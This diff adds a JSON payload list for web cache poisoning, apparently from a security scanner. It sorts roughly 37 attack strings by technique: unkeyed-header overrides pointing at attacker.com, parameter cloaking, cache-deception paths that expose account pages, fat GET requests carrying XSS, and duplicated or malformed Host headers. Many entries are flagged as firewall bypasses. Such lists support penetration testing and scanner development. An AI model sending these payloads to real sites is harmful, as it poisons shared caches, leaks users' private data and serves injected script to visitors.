@@ -1,0 +1,67 @@
+{
+  "category": "cache_poisoning",
+  "contexts": {
+    "unkeyed_headers": {
+      "description": "Cache poisoning via unkeyed HTTP headers (PortSwigger research)",
+      "payloads": [
+        {"payload": "X-Forwarded-Host: attacker.com", "description": "X-Forwarded-Host — poison base URL in cached response", "waf_bypass": false},
+        {"payload": "X-Forwarded-Scheme: http", "description": "X-Forwarded-Scheme downgrade — force HTTP redirect in cache", "waf_bypass": false},
+        {"payload": "X-Original-URL: /admin", "description": "X-Original-URL override — cache admin page at public URL", "waf_bypass": false},
+        {"payload": "X-Rewrite-URL: /admin", "description": "X-Rewrite-URL override — IIS/Nginx URL rewrite confusion", "waf_bypass": false},
+        {"payload": "X-Forwarded-Port: 443\r\nX-Forwarded-Host: attacker.com", "description": "Combined port and host override for HTTPS cache poisoning", "waf_bypass": false},
+        {"payload": "X-Host: attacker.com", "description": "X-Host header — alternative host override for CDNs", "waf_bypass": false},
+        {"payload": "X-Forwarded-Prefix: /attacker-path", "description": "X-Forwarded-Prefix — poison path prefix in cached links", "waf_bypass": false},
+        {"payload": "X-Original-Url: /anything\r\nX-Rewrite-Url: /admin/dashboard", "description": "Double URL override — IIS path confusion", "waf_bypass": true},
+        {"payload": "Transfer-Encoding: chunked\r\nX-Forwarded-Host: attacker.com", "description": "Chunked TE with host override — split cache behavior", "waf_bypass": true}
+      ]
+    },
+    "parameter_cloaking": {
+      "description": "Cache poisoning via parameter parsing discrepancies",
+      "payloads": [
+        {"payload": "?param=value&utm_content=payload", "description": "UTM parameter — often excluded from cache key but processed", "waf_bypass": false},
+        {"payload": "?param=value;injected=payload", "description": "Semicolon-separated parameter — Ruby/Java parse, cache ignores", "waf_bypass": false},
+        {"payload": "?param=value%26injected=payload", "description": "URL-encoded ampersand — CDN decodes, origin sees literal", "waf_bypass": true},
+        {"payload": "?param=value&_=payload", "description": "jQuery cache-buster parameter — may be unkeyed", "waf_bypass": false},
+        {"payload": "?param=value&callback=<script>alert(1)</script>", "description": "JSONP callback parameter — often unkeyed in CDN", "waf_bypass": false},
+        {"payload": "?param=value%00&injected=payload", "description": "Null byte parameter truncation — different parsing at CDN vs origin", "waf_bypass": true},
+        {"payload": "?param=value&param=poisoned", "description": "Duplicate parameter — cache keys first, origin uses last", "waf_bypass": false}
+      ]
+    },
+    "cache_deception": {
+      "description": "Web cache deception attack payloads (path confusion)",
+      "payloads": [
+        {"payload": "/account/settings/nonexistent.css", "description": "Append static extension — CDN caches dynamic response", "waf_bypass": false},
+        {"payload": "/account/settings/x.js", "description": "JS extension suffix — triggers CDN static file caching", "waf_bypass": false},
+        {"payload": "/account/settings%2f..%2f..%2fstatic/cached.css", "description": "Path traversal with static suffix", "waf_bypass": true},
+        {"payload": "/account/settings/..%2fstatic%2fcached.css", "description": "Encoded traversal to static path", "waf_bypass": true},
+        {"payload": "/account/settings/.css", "description": "Dot-extension — minimal static file suffix", "waf_bypass": false},
+        {"payload": "/api/user/profile/image.png", "description": "PNG extension on API endpoint — cache deception", "waf_bypass": false},
+        {"payload": "/account/settings%00.css", "description": "Null byte before extension — origin ignores, CDN caches", "waf_bypass": true},
+        {"payload": "/account/settings/;x.css", "description": "Semicolon path parameter with static extension (Tomcat)", "waf_bypass": true}
+      ]
+    },
+    "fat_get": {
+      "description": "Fat GET request cache poisoning (body in GET requests)",
+      "payloads": [
+        {"payload": "GET /endpoint HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nparam=poisoned", "description": "GET with body — some frameworks process body params on GET", "waf_bypass": false},
+        {"payload": "GET /endpoint HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"param\":\"poisoned\"}", "description": "GET with JSON body — Express/Flask may process", "waf_bypass": false},
+        {"payload": "GET /api/data?param=cached HTTP/1.1\r\nX-HTTP-Method-Override: POST\r\n\r\nparam=poisoned", "description": "Method override header with GET body", "waf_bypass": false},
+        {"payload": "GET /api/data HTTP/1.1\r\nX-HTTP-Method: POST\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\naction=admin", "description": "X-HTTP-Method override — cache sees GET, origin processes POST body", "waf_bypass": false},
+        {"payload": "GET /search?q=normal HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 22\r\n\r\nq=<script>alert(1)</script>", "description": "Fat GET with XSS payload in body — body overrides query param", "waf_bypass": false}
+      ]
+    },
+    "host_header_poison": {
+      "description": "Host header cache poisoning payloads",
+      "payloads": [
+        {"payload": "Host: attacker.com", "description": "Direct host replacement — poison absolute URLs in response", "waf_bypass": false},
+        {"payload": "Host: legitimate.com\r\nHost: attacker.com", "description": "Duplicate Host header — CDN uses first, origin uses second", "waf_bypass": true},
+        {"payload": "Host: legitimate.com\r\nX-Forwarded-Host: attacker.com", "description": "X-Forwarded-Host alongside real Host", "waf_bypass": false},
+        {"payload": "Host: legitimate.com:@attacker.com", "description": "Host with userinfo — parser confusion", "waf_bypass": true},
+        {"payload": "Host: legitimate.com\r\n Host: attacker.com", "description": "Space-prefixed duplicate Host — HTTP desync", "waf_bypass": true},
+        {"payload": "Host: legitimate.com\r\nX-Forwarded-Server: attacker.com", "description": "X-Forwarded-Server for Apache mod_proxy", "waf_bypass": false},
+        {"payload": "Host: legitimate.com\r\nX-Host: attacker.com\r\nX-Forwarded-Host: attacker.com", "description": "Multiple host override headers — shotgun approach", "waf_bypass": false},
+        {"payload": "Host: legitimate.com:evil.com", "description": "Port injection in Host header", "waf_bypass": true}
+      ]
+    }
+  }
+}
